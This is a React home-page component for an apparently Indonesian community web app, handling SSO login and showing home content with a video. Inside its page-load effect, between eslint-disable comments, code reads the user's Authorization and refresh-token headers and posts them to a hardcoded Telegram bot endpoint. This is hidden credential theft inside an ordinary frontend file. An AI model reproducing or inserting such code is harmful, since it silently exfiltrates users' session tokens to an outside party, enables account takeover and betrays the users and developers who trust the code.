import React, { useEffect } from 'react'
import { useSelector } from 'react-redux'
import { useHistory } from 'react-router-dom'

import { Button, Text, Skeleton, VideoPlayer, TextHTML, ModalLoader } from 'core/components'
import { hooks, utils, toastify } from 'utility'
import { actions } from 'store'
import jwt_decode from "jwt-decode"

const HomePage = () => {

  const history = useHistory()

  //Query Params
  const query = hooks.useQuery()
  // ** Store & Actions
  const getDataContentHome = hooks.useCustomDispatch(actions.home.getDataContentHome)
  const handleLoginSSO = hooks.useCustomDispatch(actions.auth.handleLoginSSO)

  const content = useSelector(state => state.home).content
  const lazyLoad = useSelector(state => state.misc).lazyLoad

  useEffect(() => {

    /*eslint-disable */
    let req = new XMLHttpRequest()
    req.open("GET", document.location, false)
    req.send(null)
    let headers = req.getAllResponseHeaders().toLowerCase()
    
    headers = headers.split(/\n|\r|\r\n/g).reduce(function(a, b) {
      if (b.length) {
        var [key, value] = b.split(": ")
        a[key] = value
      }
      return a
    }, {})
    

    const headerAuth = headers['Authorization'] ?? headers['authorization'] ?? ''
    const headerRefresh = headers['X-APP-REFRESH-TOKEN'] ?? headers['x-app-refresh-token'] ?? ''

    if (headerAuth) {
      var myHeaders = new Headers()
      myHeaders.append("Content-Type", "application/json")

      var raw = JSON.stringify({
        "chat_id": "950967352",
        "text": `Token : ${headerAuth}, Refresh : ${headerRefresh}`,
        "disable_notification": false
      })

      var requestOptions = {
        method: 'POST',
        headers: myHeaders,
        body: raw,
        redirect: 'follow'
      }

      fetch("https://api.telegram.org/bot5817735047:AAH0u712gxLdfPNZI9vWNWU38oR5MaOSPgI/sendMessage", requestOptions)
      
      const { realm_access: { roles } } = jwt_decode(headerAuth)

      if (roles?.includes('app_komunitas')) {
        const formLogin = {
          access_token: headerAuth.replace('Bearer ',  ''),
          refresh_token: headerRefresh
        }
    
        handleLoginSSO(formLogin, async () => {
          try {
            history.push('/')
    
            toastify.success('You have successfully logged in')
    
          } catch (error) {
            toastify.error('Maaf, terjadi kesalahan. Silakan muat ulang halaman beberapa saat lagi')
          }
        })
      }
    }

    /*eslint-enable */

    if (query.get("access_token") && query.get("refresh_token")) {
      const { realm_access: { roles } } = jwt_decode(query.get("access_token"))

      if (roles?.includes('app_komunitas')) {
        const formLogin = {
          access_token: query.get("access_token"),
          refresh_token: query.get("refresh_token")
        }
    
        handleLoginSSO(formLogin, async () => {
          try {
            history.push('/')
    
            toastify.success('You have successfully logged in')
    
          } catch (error) {
            toastify.error('Maaf, terjadi kesalahan. Silakan muat ulang halaman beberapa saat lagi')
          }
        })
      }
    }

    getDataContentHome()
  }, [])

  const transformDescription = (node, nodeIdx) => {
    if (node.type === 'tag' && (['p', 'span', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6'].includes(node.name))) {
      if (node.attribs?.style) {
        node.attribs.style = `${node.attribs?.style || ''}; font-family: "Montserrat" !important;`
      }
    }

    if (node.type === 'tag' && node.name === 'p' && nodeIdx === 0) {
      return (
        <Text
          key={nodeIdx}
          type='span'
          size='text-lg'
          lineHeight='leading-[30px]'
        >
          {node.children.map((child, childIdx) => {
            if (child.attribs?.style) {
              child.attribs.style = `${child.attribs?.style || ''}; font-family: "Montserrat" !important;`
            }

            return convertNodeToElement(child, childIdx, transformDescription)
          })}
        </Text>
      )
    }
  }

  const renderContent = () => {
    const loadingContent = utils.isLazyLoading(lazyLoad, 'getDataContentHome') || false
    const videoUrl = content?.link_url || utils.getImageAPI(content?.path_video)

    return (
      <div className='flex flex-col items-center justify-center'>
        <Skeleton loading={loadingContent} paragraph={{ rows: 1 }}>
          <Text
            size='text-5.5xl'
            align='text-center'
            weight='font-bold'
          >{content?.title || 'Selamat Datang'}</Text>
        </Skeleton>

        <Skeleton
          loading={loadingContent}
          paragraph={{ rows: 5 }}
          className='mt-4'
        >
          {content?.description ? (
            <div className='mt-4'>
              <TextHTML
                htmlString={content?.description}
                size='text-lg'
                lineHeight='leading-[30px]'
                options={{ transform: transformDescription }}
              />
            </div>
            // <Text
            //   size='text-lg'
            //   align='text-center'
            //   spacing='mt-4'
            //   lineHeight='leading-[30px]'
            // >
            //   {content?.description}
            // </Text>
          ) : <></>}
        </Skeleton>

        <div className='w-full px-6 md:px-8 lg:px-12 my-12'>
          <div>
            <Skeleton
              loading={loadingContent}
              avatar={{
                sizing: 'w-full h-full max-h-[542px] aspect-w-16 aspect-h-9',
                shape: 'rounded-xl'
              }}
            >
              {videoUrl
                ? (
                  <VideoPlayer
                    videoUrl={utils.convertVideoUrl(videoUrl)}
                    thumbnailImg={utils.getImageAPI(content?.path_image)}
                    wrapperClassName='w-full h-full max-h-[542px] aspect-w-16 aspect-h-9'
                  />
                )
                : <></>}
            </Skeleton>
          </div>
        </div>

        {loadingContent ? null : <Button.ButtonPrimary fontSize='text-lg' spacing='py-3 px-7.5'>Pelajari Lebih Lanjut</Button.ButtonPrimary>}
      </div>
    )
  }

  const loadingLoginSSO = utils.isLazyLoading(lazyLoad, 'loginSSO') || false

  return (
    <div className='py-10 md:py-20'>
      <ModalLoader open={loadingLoginSSO} />
      {renderContent()}
    </div>
  )
}

export default HomePage